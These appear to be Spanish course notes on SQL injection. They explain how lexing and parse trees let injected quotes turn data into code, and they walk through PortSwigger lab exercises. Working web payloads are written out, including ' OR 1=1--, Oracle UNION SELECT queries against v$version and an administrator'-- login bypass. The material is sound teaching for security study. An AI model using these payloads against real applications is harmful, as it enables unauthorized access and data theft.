## ① Repaso rápido — Qué es una base de datos

| Concepto | Definición |
|---|---|
| **Base de datos** | Almacén organizado de información |
| **SGBD** | Sistema Gestor de Base de Datos (MySQL, PostgreSQL, Oracle, MongoDB) |
| **Relacional** | Datos guardados en **tablas** (filas y columnas) |
| **No relacional** | Datos guardados en otros formatos (MongoDB, etc.) |

### La consulta SQL

```sql
SELECT nombre, precio FROM productos WHERE categoría = 'regalos';
```

| Parte | Controla | Ataques posibles |
|---|---|---|
| `SELECT` | Campos que devuelve | UNION attacks |
| `FROM` | De qué tabla | information_schema, otras tablas |
| `WHERE` | Filtros/condiciones | Bypass de condiciones |

## ② Low-Level: Cómo lee una base de datos una consulta

> [!important] Concepto clave
> Nosotros leemos SQL como español. El motor de la BD lo ve como una **tira de caracteres** y tiene que entenderla en **dos pasos** antes de ejecutarla.

### Paso 1: Análisis léxico (Lexer)

El motor **trocea** la tira de caracteres en piezas llamadas **tokens** y les pone una **etiqueta**:

| Token | Etiqueta |
|---|---|
| `SELECT`, `FROM`, `WHERE`, `OR`, `AND` | Palabra clave |
| `nombre`, `precio`, `categoría` | Identificador (nombre de tabla/columna) |
| `=`, `<`, `>`, `+`, `-` | Operador |
| `1`, `42`, `0` | Literal numérico |
| `'regalos'`, `'admin'` | Literal de cadena |

> [!warning] Las comillas son la separación entre datos y código
> Para el motor SQL, lo que está entre comillas es **contenido inerte** (texto). Lo que está fuera de comillas es **código ejecutable**. Por eso funcionan las comillas en SQLi: al cerrar la comilla, lo que metemos pasa de ser texto a ser código.

#### Ejemplo: Qué hace el Lexer

**Consulta original:**
```sql
WHERE categoría = 'regalos'
```

| Token | Etiqueta |
|---|---|
| `WHERE` | Palabra clave |
| `categoría` | Identificador |
| `=` | Operador |
| `'regalos'` | Literal de cadena |

**Después de la inyección (`' OR 1=1`):**
```sql
WHERE categoría = 'regalos' OR 1=1
```

| Token | Etiqueta |
|---|---|
| `WHERE` | Palabra clave |
| `categoría` | Identificador |
| `=` | Operador |
| `'regalos'` | Literal de cadena (cierra aquí) |
| `OR` | **Palabra clave** (antes era texto) |
| `1` | **Literal numérico** (antes era texto) |
| `=` | **Operador** (antes era texto) |
| `1` | **Literal numérico** (antes era texto) |

> [!important] La inyección es retiquetar
> Inyectar es conseguir que el Lexer **retiquete** lo que era texto libre como código ejecutable. Si el Lexer no retiqueta, **no hay inyección**.

---

### Paso 2: Análisis sintáctico (Parser → AST)

El Parser toma la lista de tokens etiquetados y construye un **árbol sintáctico (AST)** que representa el **significado** de la consulta.

#### ¿Por qué un árbol y no una lista?

Una lista es **plana**: no muestra dependencias ni jerarquía.

**Ejemplo:**
```sql
WHERE categoría = 'regalos' OR precio < 10
```

**Lista de tokens:**
```
WHERE | categoría | = | 'regalos' | OR | precio | < | 10
```

¿El `OR` une `categoría = 'regalos'` con `precio < 10`? ¿O une `'regalos'` con `precio`? La lista no lo dice.

**Árbol (AST):**
```
        OR
       /  \
     =      <
    / \    / \
  cat  reg  precio  10
```

El árbol dice claramente: `OR` une **dos bloques completos**.

> [!info] Ejemplo concreto: 2 + 3 × 4
> - **Lista:** `2 | + | 3 | × | 4`
> - ¿Hacemos `(2+3) × 4 = 20` o `2 + (3×4) = 14`?
> - El **árbol** lo resuelve: la multiplicación va primero porque está más abajo en la jerarquía.
> - **Resultado correcto: 14**

---

#### Por qué el árbol importa en SQLi

**Misma consulta, diferentes árboles, diferentes resultados:**

```sql
WHERE categoría = 'gifts' OR 1=1 AND released = 1
```

**Árbol A (OR es raíz):**
```
        OR
       /  \
     =     AND
    / \    / \
  cat gifts 1=1  released=1
```
→ Devuelve TODOS los productos (los publicados Y los no publicados)

**Árbol B (AND es raíz):**
```
        AND
       /  \
     OR   released=1
    / \
  =    1=1
 / \
cat gifts
```
→ Solo devuelve los **publicados** (el AND filtra todo)

> [!important] El objetivo de SQLi
> **Construir un árbol que tenga el significado que nosotros queremos.** Al inyectar tokens, cambiamos la estructura del árbol y, por lo tanto, el resultado de la consulta.

## ③ Laboratorio práctico — SQLi básica en PortSwigger

### Paso 0: Mapear la aplicación

1. Abrir Burp Suite + Foxy Proxy
2. Ir al laboratorio y hacer login
3. **Hacer clic en TODOS los botones** (cada clic = petición = mapeo)
4. En Burp → Target → HTTP History
5. Ordenar por **parámetros** → son los puntos de entrada

> [!warning] Importancia de enumerar todos los parámetros
> Si te dejas un parámetro, te quedas "con el culo al aire". Un parámetro que parece inofensivo puede ser vulnerable.

### Paso 1: Detectar SQLi

En el parámetro `category`:

```
category=Gifts'  → 500 Internal Server Error (vulnerable)
category=Gifts'' → 200 OK (comilla extra cierra)
```

### Paso 2: Verificar con OR 1=1

```
category=Gifts' OR 1=1--
```

Devuelve TODOS los productos (no solo los de Gifts) → **SQLi confirmada**.

### Paso 3: Bypass de released=1

La consulta original es:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

El `released = 1` solo muestra productos publicados. El laboratorio pide ver los **no publicados**.

**Solución:**
```
category=Gifts' OR 1=1--
```

El `OR 1=1` hace que la condición sea **siempre verdadera**, ignorando el filtro `released`.

## ④ Laboratorio avanzado — Oracle + UNION Attack

### El reto: Oracle y FROM obligatorio

En Oracle, **todo SELECT necesita un FROM**. Si no pones `FROM`, da error.

**Tabla siempre existente en Oracle:** `DUAL` (una tabla ficticia con una sola fila)

```sql
UNION SELECT banner FROM v$version--
```

Si no funciona `v$version`, probar `v$instance`.

### Metodología completa

| Paso | Qué hacemos | Ejemplo |
|---|---|---|
| 1 | Contar columnas | `ORDER BY 1--` / `ORDER BY 2--` / ... |
| 2 | Verificar tipo de datos | `UNION SELECT 'a','b' FROM DUAL--` |
| 3 | Extraer datos | `UNION SELECT banner,NULL FROM v$version--` |

> [!tip] Cheat sheet: sqlmap.org/cheat-sheets
> Siempre tener a mano el cheat sheet para saber qué tablas consultar según el tipo de BD (Oracle, MySQL, PostgreSQL).

## ⑤ SQLi en formularios de login

### La consulta detrás del login

```sql
SELECT username, password FROM users WHERE username = 'x' AND password = 'y'
```

### El ataque

En el campo `username`:
```
administrator'--
```

**¿Qué pasa?**
1. La comilla cierra el literal de cadena
2. El `--` comenta el resto (el AND password = 'y')
3. La consulta se convierte en:
```sql
SELECT username, password FROM users WHERE username = 'administrator'
```
4. Solo queda la condición del usuario → **login exitoso**

## ⑥ Notas de clave

- **SQLi a bajo nivel** = cambiar la estructura del AST (árbol sintáctico)
- **El Lexer** trocea y etiqueta: texto → tokens
- **El Parser** construye el árbol: tokens → significado
- **Las comillas** separan datos de código → al romperlas, todo lo que metemos es código
- **Oracle** siempre necesita `FROM` → usar `DUAL` como tabla por defecto
- **Siempre mapear TODOS los parámetros** antes de atacar
- **`OR 1=1`** hace que la condición sea siempre verdadera
- **`--`** comenta el resto de la query (ignora lo que viene después)
- **En login**, el `--` elimina la verificación de contraseña
- **Cheat sheet** de PortSwigger es tu amigo para tablas según tipo de BD
